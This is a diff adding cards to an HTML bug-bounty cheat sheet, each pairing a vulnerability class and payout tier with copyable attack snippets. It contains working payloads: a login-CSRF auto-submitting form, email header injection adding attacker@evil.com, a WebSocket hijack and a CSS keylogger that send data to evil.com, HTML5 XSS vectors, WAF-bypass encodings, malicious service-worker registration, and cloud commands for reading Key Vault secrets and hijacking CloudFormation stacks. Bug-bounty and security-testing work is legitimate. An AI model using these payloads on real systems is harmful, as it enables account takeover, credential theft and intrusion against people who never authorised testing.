+# 1. CDN with wildcard CORS (allow arbitrary content)
+# 2. Find unsigned JS files
+# 3. Hash collision attacks (rare but possible)
+# 4. Dynamic resource loading without SRI
+
+# Check CDN configuration
+curl -I https://cdn.target.com/app.js
+# Look for: Access-Control-Allow-Origin: *</code></pre>
+          </div>
+
+          <div class="note warn">💡 SRI bypass leading to script injection = High. SRI missing on sensitive resources = Medium.</div>
+        </div>
+      </div>
+
+      <!-- LOGIN CSRF -->
+      <div class="card" id="login-csrf">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🔐 Login CSRF</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Forcing a victim to log into the attacker's account, potentially exposing the victim's subsequent actions to the attacker.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Login CSRF attack:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Login CSRF</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># If login endpoint has no CSRF protection:
+&lt;form action="https://target.com/login" method="POST"&gt;
+  &lt;input type="hidden" name="username" value="attacker"&gt;
+  &lt;input type="hidden" name="password" value="attacker_password"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+
+# Victim is now logged into attacker's account
+# Any data they enter goes to attacker's account
+# Payment info, messages, etc.
+
+# Check: Does /login accept POST without CSRF token?</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Login CSRF on e-commerce (payment info exposure) = High. Login CSRF on social media = Medium.</div>
+        </div>
+      </div>
+
+      <!-- SESSION TOKEN IN URL -->
+      <div class="card" id="session-url">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🔗 Session Token in URL</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Session tokens leaked via URL parameters, causing exposure in browser history, logs, referrer headers, and server logs.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Detection:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>URL Token Detection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check if session tokens appear in URLs
+# https://target.com/page?session=abc123
+# https://target.com/page?token=xyz789
+# https://target.com/page?sid=abc123
+
+# Check redirects after login
+# Does the token get appended to redirect URL?
+
+# Check for tokens in Referer header
+# External links on page may leak token via Referer
+
+# Check browser history for tokens</code></pre>
+          </div>
+
+          <div class="note warn">💡 Session tokens in URL = Medium. If combined with Referer leak to third-party = High.</div>
+        </div>
+      </div>
+
+      <!-- LOCAL STORAGE SENSITIVE DATA -->
+      <div class="card" id="local-storage">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-low">Low</span>
+          <h3>💾 Local Storage Sensitive Data</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Sensitive data stored in localStorage or sessionStorage accessible via JavaScript, including tokens, PII, and credentials.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Check localStorage:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Local Storage Audit</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Browser DevTools -&gt; Application -&gt; Local Storage
+# Look for:
+# - Auth tokens
+# - API keys
+# - User PII
+# - Passwords
+# - Session data
+
+# JavaScript access:
+Object.keys(localStorage).forEach(k =&gt; console.log(k, localStorage.getItem(k)));
+
+# XSS can steal all localStorage data
+# Unlike HttpOnly cookies, localStorage is JS-accessible</code></pre>
+          </div>
+
+          <div class="note">💡 Sensitive data in localStorage combined with any XSS vulnerability escalates to High. Report as part of XSS attack chain.</div>
+        </div>
+      </div>
+
+      <!-- SERVICE WORKER ABUSE -->
+      <div class="card" id="service-worker">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>⚙️ Service Worker Abuse</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Hijacking service workers for persistence, intercepting requests, or modifying page content offline.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Service worker exploitation:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>SW Abuse</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check if service worker is registered
+navigator.serviceWorker.getRegistrations().then(r =&gt; console.log(r));
+
+# If XSS exists, register malicious SW:
+navigator.serviceWorker.register('/evil-sw.js');
+
+# Malicious SW can:
+# - Intercept all fetch requests
+# - Modify responses (inject JS)
+# - Serve cached malicious content
+# - Persist across page reloads
+
+# SW persistence survives:
+# - Browser restart
+# - Tab close/reopen
+# - Cookie clearing</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Service worker hijacking via XSS = High (persistence). SW installation from XSS alone = Medium.</div>
+        </div>
+      </div>
+
+      <!-- DNS ZONE TRANSFER -->
+      <div class="card" id="dns-zone-transfer">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🌐 DNS Zone Transfer</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> AXFR zone transfer revealing all subdomains, internal hostnames, and DNS records.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Zone transfer test:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Zone Transfer</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Find nameservers
+dig NS target.com
+
+# Attempt zone transfer
+dig axfr target.com @ns1.target.com
+host -l target.com ns1.target.com
+
+# DNSRecon
+dnsrecon -d target.com -t axfr
+
+# Reveals: all subdomains, mail servers, internal IPs
+# Leads to: subdomain takeover, internal service discovery</code></pre>
+          </div>
+
+          <div class="note warn">💡 Zone transfer revealing internal infrastructure = Medium. Zone transfer + subdomain takeover = High.</div>
+        </div>
+      </div>
+
+      <!-- EMAIL INJECTION -->
+      <div class="card" id="email-injection">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>📧 Email Injection</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> SMTP header injection via email form fields, allowing additional recipients, header manipulation, or content injection.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Email injection payloads:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Email Injection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># CRLF injection in email headers
+name=test%0d%0aBcc:attacker@evil.com
+
+# Additional recipient injection
+name=test%0A%0DTo:attacker@evil.com
+
+# Subject injection
+name=test%0A%0DSubject:Hacked
+
+# Content-type injection
+name=test%0A%0DContent-Type:text/html%0A%0A&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Body injection
+message=Hello%0D%0A%0D%0A&lt;!-- HTML injection --&gt;</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Email injection in password reset = High. Email injection in contact forms = Medium.</div>
+        </div>
+      </div>
+
+      <!-- IMAP/SMTP INJECTION -->
+      <div class="card" id="imap-smtp">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-high">High</span>
+          <h3>📬 IMAP/SMTP Injection</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Injecting commands into IMAP/SMTP protocols to read emails, send messages as victim, or exfiltrate mailbox data.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>IMAP injection payloads:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>IMAP/SMTP Injection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># IMAP command injection
+user
+LOGIN admin password
+
+# If application constructs IMAP commands from user input:
+# Inject newline to add IMAP commands
+# SELECT INBOX -&gt; SELECT "INBOX"\r\nDELETE "INBOX"
+
+# SMTP injection
+RCPT TO:&lt;attacker@evil.com&gt;
+
+# POP3 injection
+USER admin\r\nPASS password\r\nLIST
+
+# Check: Webmail interfaces, email forwarding rules
+# Test: Contact forms with IMAP backend</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> IMAP injection leading to email exfiltration = Critical. SMTP injection sending emails as victim = High.</div>
+        </div>
+      </div>
+
+      <!-- HOST HEADER RACE -->
+      <div class="card" id="host-header-race">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🏃 Host Header Race</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Race condition in host header processing where different components process different Host values, leading to cache poisoning or auth bypass.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Host header race technique:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Host Race</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Send rapid requests with different Host headers
+# Proxy/frontend may cache one Host, backend processes another
+
+# Cache poisoning via Host race:
+# 1. Send request with Host: evil.com
+# 2. Response cached for Host: target.com
+# 3. Next request to target.com gets poisoned response
+
+# Rate-limited requests:
+for i in $(seq 1 100); do
+  curl -H "Host: target.com" https://target.com/ &amp;
+  curl -H "Host: evil.com" https://target.com/ &amp;
+done</code></pre>
+          </div>
+
+          <div class="note warn">💡 Host header race leading to cache poisoning = High. Race condition with observable timing differences = Medium.</div>
+        </div>
+      </div>
+
+      <!-- WEBSOCKET CROSS-ORIGIN -->
+      <div class="card" id="websocket-cross-origin">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🔌 WebSocket Cross-Origin</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Missing origin check on WebSocket connections allowing cross-origin message injection or data exfiltration.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>WebSocket testing:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>WebSocket Test</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># From attacker page:
+&lt;script&gt;
+var ws = new WebSocket('wss://target.com/ws');
+ws.onmessage = function(e) {
+  // Exfiltrate received data
+  fetch('https://evil.com/steal?data=' + e.data);
+};
+ws.onopen = function() {
+  // Send malicious message
+  ws.send('{"action":"admin","cmd":"list_users"}');
+};
+&lt;/script&gt;
+
+# Check: Does server validate Origin header?
+# WebSocket Origin header can be spoofed</code></pre>
+          </div>
+
+          <div class="note warn">💡 WebSocket without origin validation = Medium. WebSocket allowing admin commands from external origin = High.</div>
+        </div>
+      </div>
+
+      <!-- HTML5 SECURITY -->
+      <div class="card" id="html5-security">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🎬 HTML5 Security</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> XSS and security issues via HTML5 tags (video, audio, source, poster, svg, canvas) and attributes.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>HTML5 XSS vectors:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>HTML5 XSS</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Video/audio with error event
+&lt;video src=x onerror="alert(1)"&gt;
+
+# Source with error
+&lt;video&gt;&lt;source onerror="alert(1)"&gt;&lt;/video&gt;
+
+# Poster attribute
+&lt;video poster="x" onerror="alert(1)"&gt;
+
+# SVG with onload
+&lt;svg onload="alert(1)"&gt;
+
+# Canvas fingerprinting
+&lt;canvas id="c"&gt;&lt;/canvas&gt;
+&lt;script&gt;document.getElementById('c').toDataURL()&lt;/script&gt;
+
+# data: URI scheme
+&lt;a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;</code></pre>
+          </div>
+
+          <div class="note warn">💡 HTML5 XSS vectors often bypass filters. Test all media-related tags for error event handlers.</div>
+        </div>
+      </div>
+
+      <!-- REGEX DOS (ReDoS) -->
+      <div class="card" id="regex-dos">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🔴 Regex DoS (ReDoS)</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Catastrophic backtracking in regex patterns causing CPU exhaustion and denial of service.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>ReDoS detection:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>ReDoS</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Vulnerable patterns:
+# (a+)+$    -&gt; aaaaaaaaaaaaaab
+# (a|b)+$   -&gt; aaaaaaaaaaaaaaaaaaaac
+# (a+b?)+$  -&gt; aaaaaaaaaaaaaaaaaaaab
+
+# Test payloads:
+# Repeat the quantified group many times
+# Add one character that fails the final match
+
+# Example: pattern /(a+)+b/
+# Payload: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac
+
+# Tool: safe-regex
+npm install safe-regex
+safe-regex "(a+)+$"</code></pre>
+          </div>
+
+          <div class="note warn">💡 ReDoS on authentication endpoints = High. ReDoS on search/input validation = Medium.</div>
+        </div>
+      </div>
+
+      <!-- AWS WAF BYPASS -->
+      <div class="card" id="aws-waf">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🛡️ AWS WAF Bypass</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Techniques to bypass AWS WAF rules for SQL injection, XSS, or other attack vectors.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>AWS WAF bypass techniques:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>AWS WAF Bypass</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Case variation
+SELECT -&gt; sElEcT, SeLeCt
+
+# URL encoding
+' OR 1=1 -&gt; %27%20OR%201%3D1
+
+# Double encoding
+' -&gt; %2527
+
+# Unicode normalization
+' -&gt; %C0%27, %E0%80%27
+
+# SQL comments
+'/**/OR/**/1=1
+
+# Chunked transfer
+Transfer-Encoding: chunked
+# Split payload across chunks
+
+# HTTP/2 smuggling
+# H2C upgrade bypass</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> WAF bypass enabling SQLi or XSS = High value. Document each bypass technique used.</div>
+        </div>
+      </div>
+
+      <!-- AZURE APP SERVICE MISCONFIGURATION -->
+      <div class="card" id="azure-app-service">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>☁️ Azure App Service Misconfiguration</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Remote code execution via deployment slots, misconfigured app settings, or exposed Kudu management API.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Azure App Service attacks:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>App Service Attack</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Kudu API (management endpoint)
+https://target.scm.azurewebsites.net/
+
+# Check for exposed deployment credentials
+# SCM (Source Control Management) access
+
+# Deployment slot swapping
+# Staging slot may have different config
+https://target-staging.azurewebsites.net/
+
+# Environment variables
+# Check WEBSITE_SITE_NAME, APPINSIGHTS_INSTRUMENTATIONKEY
+# Azure WebJobs connection strings
+
+# SSH access (if enabled)
+https://target.scm.azurewebsites.net/ssh</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Kudu API access = High. Deployment slot with sensitive data = Medium. Environment variable leak = High.</div>
+        </div>
+      </div>
+
+      <!-- GCP ORGANIZATION POLICY BYPASS -->
+      <div class="card" id="gcp-org-bypass">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>☁️ GCP Organization Policy Bypass</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Bypassing GCP organization policy constraints to access restricted resources or perform unauthorized actions.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Org policy bypass techniques:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Org Policy Bypass</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># List current constraints
+gcloud resource-manager org-policies list --project=TARGET_PROJECT
+
+# Check for constraints:
+# - iam.disableServiceAccountKeyCreation
+# - compute.restrictProjectRemoval
+# - storage.uniformBucketLevelAccess
+
+# Bypass attempts:
+# - Service account impersonation
+# - Resource hierarchy manipulation
+# - Cross-project resource access
+
+# Check for custom constraints
+gcloud resource-manager org-policies list --format="table(constraint,booleanPolicy,enforce)"</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Org policy bypass leading to resource access = High. Org policy misconfiguration = Medium.</div>
+        </div>
+      </div>
+
+      <!-- AZURE KEY VAULT MISCONFIGURATION -->
+      <div class="card" id="azure-keyvault">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-high">High</span>
+          <h3>☁️ Azure Key Vault Misconfiguration</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Overly permissive access policies on Azure Key Vault exposing secrets, certificates, and keys.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Key Vault enumeration:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Key Vault Enumeration</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># List key vaults
+az keyvault list --query "[].{name:name,location:location}"
+
+# Check access policies
+az keyvault show --name TARGET_VAULT --query "properties.accessPolicies"
+
+# List secrets (if you have access)
+az keyvault secret list --vault-name TARGET_VAULT
+
+# Read secret values
+az keyvault secret show --vault-name TARGET_VAULT --name SECRET_NAME
+
+# List keys and certificates
+az keyvault key list --vault-name TARGET_VAULT
+az keyvault certificate list --vault-name TARGET_VAULT</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> Access to Key Vault with production secrets = Critical. Key Vault with overly permissive policy = High.</div>
+        </div>
+      </div>
+
+      <!-- AZURE AD PRIVILEGE ESCALATION -->
+      <div class="card" id="azure-ad">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-critical">Critical</span>
+          <h3>☁️ Azure AD Privilege Escalation</h3>
+          <span class="tag pay">$$$$_$: Critical Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Role escalation, service principal abuse, or misconfigured Azure AD permissions leading to tenant compromise.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Azure AD enumeration:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Azure AD Enum</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Current user info
+az ad signed-in-user show
+
+# List role assignments
+az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv)
+
+# Check for privileged roles
+az role assignment list --role "Owner" --query "[].principalName"
+az role assignment list --role "Contributor" --query "[].principalName"
+
+# Service principal enumeration
+az ad sp list --show-mine
+
+# Check for Global Administrator
+az ad user get-member-group --id CURRENT_USER_ID</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> Azure AD privilege escalation to Global Admin = Critical. Service principal abuse for resource access = High.</div>
+        </div>
+      </div>
+
+      <!-- GCP PROJECT-WIDE SSH KEYS -->
+      <div class="card" id="gcp-ssh">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-high">High</span>
+          <h3>☁️ GCP Project-Wide SSH Keys</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Project-level SSH keys affecting all instances, allowing access to any VM in the project.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>GCP SSH key enumeration:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>GCP SSH Keys</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check project-wide SSH keys
+gcloud compute project-info describe --format="value(commonInstanceMetadata.items)"
+
+# List instances
+gcloud compute instances list
+
+# If you have project-wide SSH key access:
+# SSH into any instance in the project
+gcloud compute instances ssh INSTANCE_NAME --zone=ZONE
+
+# Check for OS Login
+gcloud compute os-login describe-profile
+
+# Project-level SSH keys bypass per-instance key restrictions</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> Project-wide SSH key with access to all instances = Critical. SSH key on sensitive instance = High.</div>
+        </div>
+      </div>
+
+      <!-- AWS CLOUDFORMATION INJECTION -->
+      <div class="card" id="aws-cloudformation">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-high">High</span>
+          <h3>☁️ AWS CloudFormation Injection</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Template injection or resource hijacking via CloudFormation, leading to infrastructure compromise.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>CloudFormation attacks:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>CloudFormation</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># List stacks
+aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE
+
+# Get stack resources and outputs
+aws cloudformation describe-stacks --stack-name TARGET_STACK
+
+# Check for exposed template bodies
+aws cloudformation get-template --stack-name TARGET_STACK
+
+# Resource hijacking via stack update
+# If you can update a template, inject malicious resources:
+# - EC2 instance with reverse shell
+# - IAM role with admin access
+# - S3 bucket for data exfiltration</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> CloudFormation template modification = Critical. Stack output with sensitive data = High.</div>
+        </div>
+      </div>
+
+      <!-- AWS ECR CONTAINER EXPOSURE -->
+      <div class="card" id="aws-ecr">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-high">High</span>
+          <h3>☁️ AWS ECR Container Exposure</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Public container registries or image vulnerability scanning bypass exposing sensitive container images.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>ECR enumeration:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>ECR Enumeration</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># List repositories
+aws ecr describe-repositories
+
+# List images
+aws ecr describe-images --repository-name TARGET_REPO
+
+# Get image details (may expose env vars in metadata)
+aws ecr describe-image-scan-findings --repository-name TARGET_REPO --image-id imageTag=latest
+
+# Pull public images (if policy allows)
+aws ecr get-login-password | docker login --username AWS --password-stdin ACCOUNT.dkr.ecr.REGION.amazonaws.com
+docker pull ACCOUNT.dkr.ecr.REGION.amazonaws.com/REPO:latest
+
+# Check for secrets in image layers</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> Public ECR with sensitive images = High. ECR with leaked credentials in image = Critical.</div>
+        </div>
+      </div>
+
+      <!-- AWS COGNITO SECURITY -->
+      <div class="card" id="aws-cognito">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-high">High</span>
+          <h3>☁️ AWS Cognito Security</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> User pool misconfiguration, token manipulation, or attribute-based access control bypass in AWS Cognito.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Cognito attack vectors:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Cognito Attacks</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># User pool enumeration
+# Find User Pool ID from JS source or JWT token
+# Format: REGION:UUID
+
+# Token manipulation
+# Modify JWT claims (if not validated server-side)
+# Change sub, email, role claims
+
+# Attribute manipulation
+# During signup, inject admin attributes
+# {"email": "user@evil.com", "custom:role": "admin"}
+
+# Client secret exposure
+# Check JS source for User Pool Client Secret
+# Use for OAuth flows
+
+# Hosted UI exploitation
+# Check callback URLs for open redirect</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> Cognito admin privilege escalation = Critical. Token manipulation for access = High.</div>
+        </div>
       </div>
 
       <!-- AWS S3 BUCKET MISCONFIGURATION -->
@@ -2792,6 +4086,106 @@ aws cloudtrail get-event-selectors --trail-name target</code></pre>
       </div>
 
      </div>
+
+
+      <!-- FEATURE POLICY ABUSE -->
+      <div class="card" id="feature-policy">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-low">Low</span>
+          <h3>🛡️ Feature Policy Abuse</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Abusing Permissions-Policy or Feature-Policy headers to enable restricted browser features for exploitation.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Feature policy testing:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Feature Policy</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check current permissions policy
+curl -I https://target.com/ | grep -i "permissions-policy\|feature-policy"
+
+# Look for overly permissive policies:
+# Permissions-Policy: camera=*, microphone=*, geolocation=*
+# Feature-Policy: payment *
+
+# Abusable features:
+# - camera: *, microphone: * (media capture)
+# - geolocation: * (location tracking)
+# - payment: * (payment API access)
+# - usb: *, serial: *, bluetooth: * (hardware access)
+# - accelerometer: *, gyroscope: * (device sensors)</code></pre>
+          </div>
+
+          <div class="note">💡 Feature policy issues are generally Low. Report as security hardening recommendation. Combined with other findings, may escalate severity.</div>
+        </div>
+      </div>
+
+      <!-- MIXED CONTENT -->
+      <div class="card" id="mixed-content">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-low">Low</span>
+          <h3>🔗 Mixed Content</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> HTTP resources loaded on HTTPS pages, potentially allowing content injection or data interception.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Detect mixed content:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Mixed Content Detection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check for HTTP resources on HTTPS pages
+curl -s https://target.com/ | grep -o 'http://[^"]*'
+
+# Browser DevTools -&gt; Console
+# Look for: "Mixed Content: The page was loaded over HTTPS,
+# but requested an insecure image/resource"
+
+# Types:
+# - Passive (images, video, audio) - blocked by browser
+# - Active (scripts, iframes, fetch) - blocked by browser
+
+# If active mixed content loads:
+# Attacker can inject scripts via MITM on HTTP resource</code></pre>
+          </div>
+
+          <div class="note">💡 Mixed content is generally Low. Active mixed content that loads = Medium. Report as security hardening recommendation.</div>
+        </div>
+      </div>
+
+      <!-- CSS INJECTION -->
+      <div class="card" id="css-injection">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-low">Low</span>
+          <h3>🎨 CSS Injection</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> CSS-based data exfiltration, UI redress attacks, or content injection via CSS injection vectors.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>CSS injection for data exfiltration:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>CSS Injection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Data exfiltration via CSS (attribute selectors)
+input[value^="a"] { background: url(https://evil.com/a); }
+input[value^="b"] { background: url(https://evil.com/b); }
+input[value^="c"] { background: url(https://evil.com/c); }
+# Continue for each character to exfiltrate secrets
+
+# UI redress via CSS
+&lt;style&gt;
+iframe { position:fixed; top:0; left:0; width:100%; height:100%; z-index:999; }
+&lt;/style&gt;
+&lt;iframe src="https://target.com"&gt;&lt;/iframe&gt;
+
+# CSS keylogger
+&lt;style&gt;
+input:focus { background: url(https://evil.com/log?key=); }
+&lt;/style&gt;</code></pre>
+          </div>
+
+          <div class="note">💡 CSS injection for data exfiltration = Medium. UI redress/clickjacking via CSS = Low. CSS keylogger = Medium.</div>
+        </div>
+      </div>
 
      <!-- ==================== RECON TAB ==================== -->
     <div class="tab-content" id="tab-recon">
